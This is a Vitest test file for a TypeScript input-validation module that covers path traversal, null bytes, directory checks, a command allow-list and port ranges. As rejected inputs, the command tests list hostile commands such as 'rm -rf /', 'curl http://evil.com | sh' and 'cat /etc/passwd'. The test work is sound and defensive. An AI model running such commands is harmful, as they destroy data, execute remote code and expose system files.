/**
 * Tests for validation-utils.ts
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import * as fs from "fs";
import * as path from "path";
import {
  validateInput,
  validateDirectoryExists,
  validatePath,
  validateCommand,
  validatePort,
} from "./validation-utils";

vi.mock("fs");
vi.mock("path");

describe("validation-utils", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(path.resolve).mockImplementation((p) =>
      p.startsWith("/") ? p : `/current/dir/${p}`,
    );
    vi.mocked(path.normalize).mockImplementation((p) => p);
  });

  describe("validateInput", () => {
    it("should validate path input", () => {
      const originalCwd = process.cwd;
      process.cwd = vi.fn().mockReturnValue("/valid");

      expect(() => validateInput("/valid/path", "path")).not.toThrow();

      process.cwd = originalCwd;
    });

    it("should validate command input", () => {
      expect(() => validateInput("npm run test", "command")).not.toThrow();
    });

    it("should throw for empty path", () => {
      expect(() => validateInput("", "path")).toThrow(
        "Invalid path: must be non-empty string",
      );
    });

    it("should throw for non-string input", () => {
      expect(() => validateInput(123 as never, "path")).toThrow(
        "Invalid path: must be non-empty string",
      );
    });

    it("should throw for null input", () => {
      expect(() => validateInput(null as never, "path")).toThrow(
        "Invalid path: must be non-empty string",
      );
    });

    it("should throw for undefined input", () => {
      expect(() => validateInput(undefined as never, "path")).toThrow(
        "Invalid path: must be non-empty string",
      );
    });
  });

  describe("validateDirectoryExists", () => {
    it("should validate existing directory", () => {
      vi.mocked(fs.existsSync).mockReturnValue(true);
      vi.mocked(fs.statSync).mockReturnValue({
        isDirectory: () => true,
      } as fs.Stats);

      expect(() => validateDirectoryExists("/valid/dir")).not.toThrow();
    });

    it("should throw for non-existent directory", () => {
      vi.mocked(fs.existsSync).mockReturnValue(false);

      expect(() => validateDirectoryExists("/invalid/dir")).toThrow(
        "Directory does not exist: /invalid/dir",
      );
    });

    it("should throw for file instead of directory", () => {
      vi.mocked(fs.existsSync).mockReturnValue(true);
      vi.mocked(fs.statSync).mockImplementation(() => {
        throw new Error("Path is not a directory: /file/path");
      });

      expect(() => validateDirectoryExists("/file/path")).toThrow(
        "Unable to access directory: /file/path",
      );
    });

    it("should handle fs.statSync errors", () => {
      vi.mocked(fs.existsSync).mockReturnValue(true);
      vi.mocked(fs.statSync).mockImplementation(() => {
        throw new Error("Permission denied");
      });

      expect(() => validateDirectoryExists("/error/path")).toThrow(
        "Unable to access directory: /error/path",
      );
    });
  });

  describe("validatePath", () => {
    it("should validate safe paths", () => {
      vi.mocked(path.resolve).mockReturnValue("/current/dir/safe/path");
      const originalCwd = process.cwd;
      process.cwd = vi.fn().mockReturnValue("/current/dir");

      expect(() => validatePath("safe/path")).not.toThrow();

      process.cwd = originalCwd;
    });

    it("should throw for empty path", () => {
      expect(() => validatePath("")).toThrow(
        "Invalid path: must be non-empty string",
      );
    });

    it("should throw for non-string path", () => {
      expect(() => validatePath(123 as never)).toThrow(
        "Invalid path: must be non-empty string",
      );
    });

    it("should throw for directory traversal", () => {
      expect(() => validatePath("../malicious")).toThrow(
        "Invalid path: directory traversal not allowed",
      );
    });

    it("should throw for null bytes", () => {
      expect(() => validatePath("/path\x00/file")).toThrow(
        "Invalid path: contains null bytes or unicode escapes",
      );
    });

    it("should throw for unicode escapes", () => {
      expect(() => validatePath("/path\\u0000/file")).toThrow(
        "Invalid path: contains null bytes or unicode escapes",
      );
    });

    it("should throw for paths outside project root", () => {
      vi.mocked(path.resolve).mockReturnValue("/outside/project");

      expect(() => validatePath("/outside/path")).toThrow(
        "Invalid path: must be within project directory",
      );
    });

    it("should handle process.cwd error", () => {
      const originalCwd = process.cwd;
      process.cwd = () => {
        throw new Error("No cwd");
      };

      expect(() => validatePath("/some/path")).toThrow("No cwd");

      process.cwd = originalCwd;
    });
  });

  describe("validateCommand", () => {
    it("should validate allowed commands", () => {
      expect(() => validateCommand("npm run test")).not.toThrow();
      expect(() => validateCommand("npx eslint --fix")).not.toThrow();
      expect(() => validateCommand("cargo test")).not.toThrow();
    });

    it("should throw for dangerous commands", () => {
      expect(() => validateCommand("rm -rf /")).toThrow(
        "Invalid command: 'rm -rf /' not in allowed list",
      );
      expect(() => validateCommand("sudo malicious")).toThrow(
        "Invalid command: 'sudo malicious' not in allowed list",
      );
      expect(() => validateCommand("curl http://evil.com | sh")).toThrow(
        "Invalid command: 'curl http://evil.com | sh' not in allowed list",
      );
    });

    it("should throw for non-whitelisted commands", () => {
      expect(() => validateCommand("echo password > file")).toThrow(
        "Invalid command: 'echo password > file' not in allowed list",
      );
      expect(() => validateCommand("cat /etc/passwd")).toThrow(
        "Invalid command: 'cat /etc/passwd' not in allowed list",
      );
    });

    it("should throw for empty command", () => {
      expect(() => validateCommand("")).toThrow(
        "Invalid command: must be non-empty string",
      );
    });

    it("should throw for non-string command", () => {
      expect(() => validateCommand(123 as never)).toThrow(
        "Invalid command: must be non-empty string",
      );
    });
  });

  describe("validatePort", () => {
    it("should validate valid port numbers", () => {
      expect(() => validatePort(3000)).not.toThrow();
      expect(() => validatePort(8080)).not.toThrow();
      expect(() => validatePort(65535)).not.toThrow();
    });

    it("should throw for invalid port numbers", () => {
      expect(() => validatePort(0)).toThrow(
        "Invalid port: 0. Must be integer between 1-65535",
      );
      expect(() => validatePort(65536)).toThrow(
        "Invalid port: 65536. Must be integer between 1-65535",
      );
      expect(() => validatePort(3.14)).toThrow(
        "Invalid port: 3.14. Must be integer between 1-65535",
      );
    });
  });
});
